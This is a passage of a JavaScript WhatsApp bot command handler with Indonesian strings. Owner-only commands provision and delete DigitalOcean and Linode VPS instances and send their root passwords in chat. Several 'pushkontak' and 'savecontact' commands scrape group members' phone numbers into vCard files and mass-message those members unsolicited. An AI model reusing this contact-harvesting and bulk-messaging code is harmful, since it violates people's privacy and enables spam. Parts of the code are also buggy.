      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await zuu.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break        
     case "vps8g4c": {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await zuu.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break
case 'svps': case 'sendvps': {
		 if (!isCreator) return (`Ngapain Pea`)
          if (!text) return reply(`Example : ${prefix + command} 6285xxxxx,ip,ram,harga,passwordvps`)
            reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m223 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
            var m4 = mon.split(",")[3]
            var m5 = mon.split(",")[4]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
zuu.sendMessage(mq1, {text:`*───❖》Dgf Tdgf《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m4}*\n*Hari : *\n*Tanggal : *\n*Jam : *\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Ip : ${m223}*\n*[+] Username : root*\n*[+] Password : ${m5}*\n*[+] Ram : ${m3}*\n\n*───《TOS VPS》───*\n\n*-JANGAN SAMPAI TERKENA DDOS*\n*-JANGAN GUNAKAN UNTUK DDOS*\n*-JANGAN GUNAKAN UNTUK MINING*\n*-CPU JANGAN SAMPAI 100%*\n*-MELANGGAR RULES? GARANSI ANGUS*\n*-PANEL SUS NO REFF*`}, m) 
                 }
            break
      //=============[Push Kontak]==============//
      case "cekidgc": case "listgroup": {
if (!isPremium) return reply("Ouh")
let getGroups = await zuu.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `*${m2}[ LIST GROUP DI BAWAH ]${m2}*\n\nSaya Tambahkan .id agar tes dapat tersalin, id group hanya berupa nomor`



for (let x of anu) {
let metadata2 = await zuu.groupMetadata(x)
const idnyahrooo = metadata2.id.replace(/@g\.us/g, '.id')
teks += `\n昤─ ─────────── ─昤
⟡ Nama : ${metadata2.subject}
⟡ ID : ${idnyahrooo}
⟡ Member : ${metadata2.participants.length}
昤─ ─────────── ─昤\n`
}
reply(teks)
}
break
case "pushkontakv1":{
if (!isCreator) return reply("Ouh")
if (isGroup) return reply("Kusus di Chat Pribadi")
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)

const groupMetadataa = !isGroup? await zuu.groupMetadata(`${text.split("|")[0]}@g.us`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkon = text.split("|")[1]
if (isContacts) return
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./lib/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await zuu.downloadAndSaveMediaMessage(quoted)
memk = await TelegraPh(media)
await zuu.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(1000)
} else {
await zuu.sendMessage(mem, { text: global.tekspushkon })
await sleep(1000)
}
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK SI: ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./lib/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await zuu.sendMessage(m.chat, { document: fs.readFileSync("./lib/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./lib/database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushkontakv2":{
if (!isCreator) return reply("Ouh")
if (!isGroup) return reply("Khusus Di Group")
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)

const groupMetadata = isGroup? await zuu.groupMetadata(m.chat).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv2 = text
if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./lib/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await zuu.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)

setTimeout(async () => {
 zuu.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
}, 2100)
} else {
setTimeout(async () => {
zuu.sendMessage(men, { text: global.tekspushkonv2 })
}, 2100)
}
}
reply("File Kontak Sudah Di Kirim Lewat Chat Pribadi")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK SI: ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./lib/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await zuu.sendMessage(sender, { document: fs.readFileSync("./lib/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./lib/database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushkontakv3":
if (!isCreator) return reply("Ouh")
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|jeda|teks\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
console.log("?") //   ini pengalih
const groupMetadataa = !isGroup? await zuu.groupMetadata(`${q.split("|")[0]}@g.us`).catch(e => {}) : ""
const participantss = !isGroup? await groupMetadataa.participants : ""
const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv3 = q.split("|")[2]
for (let mem of halls) {
if (/image/.test(mime)) {
media = await zuu.downloadAndSaveMediaMessage(quoted)
memk = await TelegraPh(media)

setTimeout(async () => {
 zuu.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv3 })
}, q.split("|")[1])

} else {
setTimeout(async () => {
zuu.sendMessage(mem, { text: global.tekspushkonv3 })
}, q.split("|")[1])
}
}
reply("sukses")
break
case "pushkontakv4":
if (!isCreator) return reply("Ouh")
if (!isGroup) return reply("Khusus grup Private")
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} jeda|teks`)
console.log('?') // ini juga pengalih
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv4 = text.split("|")[1]
for (let men of halsss) {
if (/image/.test(mime)) {
media = await zuu.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPH(media)

setTimeout(async () => {
 zuu.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 })
}, text.split("|")[0])
} else {
setTimeout(async () => {
await zuu.sendMessage(men, { text: global.tekspushkonv4 })
}, text.split("|")[0])
}
}
reply("Sukses")
break
case "savecontactv1": {
if (!isCreator) return reply("Ouh")
if (!isGroup) return reply(`Maaf Kak Fitur ${prefix+command} Hanya Bisa Di Gunakan Di Dalam Group\nUntuk Memasukan Bot Ke Dalam Group Yang Di Ingin Kan\nSilahkan Ketik Command .join linkgroup`)

const groupMetadata = isGroup? await zuu.groupMetadata(m.chat).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (isContacts) return
contacts.push(men)
fs.writeFileSync('./lib/database/contacts.json', JSON.stringify(contacts))
}
reply("Sukses File Sudah Di Kirim Lewat Chat Private")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK SI: ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./lib/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await zuu.sendMessage(sender, { document: fs.readFileSync("./lib/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./lib/database/contacts.json", JSON.stringify(contacts))
}
}
break
case 'getcontact': case 'getkontak':
if (!isPremium) return reply("Ouh")
if (!isGroup) return reply(`Khusus Group`)
huhuhs = await zuu.sendMessage(m.chat, {
    text: `Grup; *${groupMetadata.subject}*\nTotal peserta; *${participants.length}*\n\nSending contact...`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) 
zuu.sendContact(m.chat, participants.map(a => a.id), huhuhs)
break
case 'savekontak': case 'svkontak':
if (!isCreator) return reply("Ouh")
if (!isGroup) return reply(`Khusus Group`)
let cmiggc = await zuu.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './lib/database/contacts.vcf'
reply('*Mengimpor '+cmiggc.participants.length+' kontak..*')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
zuu.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *'+cmiggc.subject+'*\nMEMBER: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
break
case 'sendkontak': case 'kontak':
if (!isCreator) return reply("Ouh")
if (!isGroup) return reply("Harus di  grup")
if (!m.mentionedJid[0]) return reply('Example: .kontak @tag|nama')
let snTak = text.split('|')[1] ? text.split('|')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split("@")[0]+":"+m.mentionedJid[0].split("@")[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
}
zuu.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
break
case "savecontactv2": {
if (!isCreator) return reply("Ouh")
if (isGroup) return reply("Khusus Di Chat Private")
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)

const groupMetadataa = !isGroup? await zuu.groupMetadata(`${text}@g.us`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./lib/database/contacts.json', JSON.stringify(contacts))
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK SI: ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./lib/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await zuu.sendMessage(m.chat, { document: fs.readFileSync("./lib/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./lib/database/contacts.json", JSON.stringify(contacts))
}
}
break
case 'bcgc': case 'bcgroup': {
if (!isCreator) return reply('Khusus owner')
if (!text) return reply(`Text mana?\n\nExample : ${prefix + command} Update ${global.botname} !`)
let getGroups = await zuu.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat.`)
for (let i of anu) {
await sleep(1500)
zuu.sendMessage(i, {text: `${text}`}, {quoted:m})
    }
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'jpm':{
if (!isCreator) return reply("?")
if (!text) return replygcxeon(`*Salah Format*\n${prefix+command} text|jeda\nReply foto untuk di jpm Kasih jeda, 1000 = 1 detik\n\nExample: ${prefix + command} kris siamang tunggal|4000`)
let getGroups = await zuu.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await zuu.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await zuu.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPH(media)
await zuu.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await zuu.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply(`Success`)
}
break 
      
       //=============[ Linode ]=================//
     case "deletelinode": {
  if (!isCreator) return reply('Maaf, command ini hanya untuk pemilik.');

  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  let deleteLinode = async () => {
    try {
      let response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      if (response.status === 204) {
        reply('Linode berhasil dihapus.');
      } else {
        throw new Error('Gagal menghapus Linode.');
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus Linode:', error);
      reply('Sukses Menghapus Linode.');
    }
  };

  deleteLinode();

  break;
}
case "sisalinode": {
  if (!isCreator) return reply("Tak nak");

  async function getLinodeInfo() {
    try {
      const response = await fetch('https://api.linode.com/v4/account', {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`,
        },
      });

      if (response.ok) {
        const accountInfo = await response.json();
        const linodeLimit = accountInfo.data.active_promo?.total || 0;
        const linodesCount = accountInfo.data.active_promo?.remaining || 0;

        return {
          linodeLimit,
          remainingLinodes: linodesCount,
          totalLinodes: linodeLimit - linodesCount,
        };
      } else {
        throw new Error('Gagal mendapatkan data akun Linode.');
      }
    } catch (error) {
      throw error;
    }
  }

  // Definisikan fungsi untuk mengeksekusi kasus "sisalinode"
  async function sisalinodtetotdler() {
    try {
      if (!isCreator) {
        return reply('Lu Siapanya Gua Anjg');
      }

      const linodeInfo = await getLinodeInfo();
      reply(`*Sisa VPS Linode Yang Dapat Anda Buat: ${linodeInfo.remainingLinodes}*

*Total VPS Linode Yang Sudah Terbuat: ${linodeInfo.totalLinodes}*`);
    } catch (error) {
      reply(`Terjadi kesalahan: ${error.message}`);
    }
  }

  sisalinodtetotdler();
  break;
}

            
            
case "rebuildlinode": {
  if (!isCreator) return reply(`Lu Siapanya Gua Anjg Gausah Nyuruh Nyuruh Gua Anjg`);

  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  let password = args[1]; // Mengambil password dari argumen kedua (jika ada)
  if (!password) return reply('Password belum diberikan.');

  let rebuildVPS = async () => {
    try {
      // Rebuild VPS menggunakan API Linode
      const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/rebuild`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        },
        body: JSON.stringify({
          image: 'linode/ubuntu20.04', // Ganti dengan ID atau label image yang ingin digunakan untuk rebuild
          root_pass: password // Menggunakan password yang diberikan
        })
      });

      if (response.ok) {
        reply('Rebuild VPS berhasil dimulai.');

        // Mendapatkan informasi VPS setelah rebuild
        const vpsInfo = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const ipAddress = vpsData.ipv4[0] || 'Tidak ada IP';

          const textvps = `*VPS SUKSES REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: Ubuntu 20.04\nPASSWORD: ${password}`;
          await sleep(60000);
          zuu.sendMessage(m.chat, { text: textvps });
        } else {
          reply('Gagal mendapatkan informasi VPS setelah rebuild.');
        }
      } else {
        const errorData = await response.json();
        reply('Gagal melakukan rebuild VPS:', errorData.errors[0].reason);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan rebuild VPS:', error.message);
    }
  };

  rebuildVPS();
  break;
}

case "linode8gb": {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-4', // Spesifikasi 8GB RAM 4 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await zuu.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;
           
case "linode16gb": {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south',
      type: 'g6-standard-8',
      image: 'linode/ubuntu20.04',
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await zuu.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;
            
case "cekvpslinode": {
  if (!isCreator) return reply('Maaf, perintah ini hanya untuk pemilik.');

  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  // Mendapatkan informasi VPS Linode berdasarkan ID
  const getLinodeInfo = async (linodeId) => {
    try {
      const apiUrl = `https://api.linode.com/v4/linode/instances/${linodeId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      if (response.ok) {
        const linodeInfo = await response.json();

        const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode
        const ram = `${linodeInfo.specs.memory / 1024} GB`; // RAM VPS dalam GB
        const os = linodeInfo.image.distribution; // Nama OS
        const cpu = `${linodeInfo.specs.vcpus} vCPUs`; // Jumlah vCPUs
        const storage = linodeInfo.specs.disk; // Kapasitas penyimpanan
        const status = linodeInfo.status; // Status VPS

        const createDate = new Date(linodeInfo.created); // Tanggal pembuatan VPS
        const formattedCreateDate = createDate.toLocaleDateString();

        return {
          linodeid: linodeInfo.id,
          label: linodeInfo.label,
          ip: ipAddress,
          ram,
          os,
          cpu,
          storage,
          status,
          createDate: formattedCreateDate
        };
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal memeriksa detail Linode: ${errorData.errors[0].reason}`);
      }
    } catch (error) {
      throw new Error(`Terjadi kesalahan saat memeriksa detail Linode: ${error.message}`);
    }
  };

  getLinodeInfo(linodeId)
    .then((info) => {
      let textku = `*DETAIL VPS LINODE*\nLinode Id: ${info.linodeid}\nLabel: ${info.label}\nIP: ${info.ip}\nRAM: ${info.ram}\nOS: ${info.os}\nCPU: ${info.cpu}\nStorage: ${info.storage}\nStatus: ${info.status}\nCreate On: ${info.createDate}\n`;
      zuu.sendMessage(m.chat, { text: textku });
    })
    .catch((err) => {
      reply(err);
      zuu.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS Linode.' });
    });

  break;
}


            

case "linode2gb": {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-1', // Spesifikasi 1GB RAM 1 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await zuu.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;
            
            
 case "linode4gb": {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-2', // Spesifikasi 2GB RAM 1 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await zuu.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;

            
case "saldolinode":
  if (!isCreator) return reply("Tak nak");

  // Endpoint untuk mengambil informasi saldo promosi Linode
  const linodePromotionsEndpoint = 'https://api.linode.com/v4/profile';

  // Konfigurasi untuk melakukan permintaan ke API Linode
  const config = {
    headers: {
      'Authorization': `Bearer ${LINODE_API_TOKEN}`
    }
  };

  // Mengambil informasi saldo promosi dari Linode
  axios.get(linodePromotionsEndpoint, config)
    .then(response => {
      // Periksa apakah saldo promosi tersedia dalam respons
      if (response.data && Array.isArray(response.data.data)) {
        // Saldo promosi dapat ada dalam elemen pertama jika ada
        const saldoPromosi = response.data.data[0].balance;
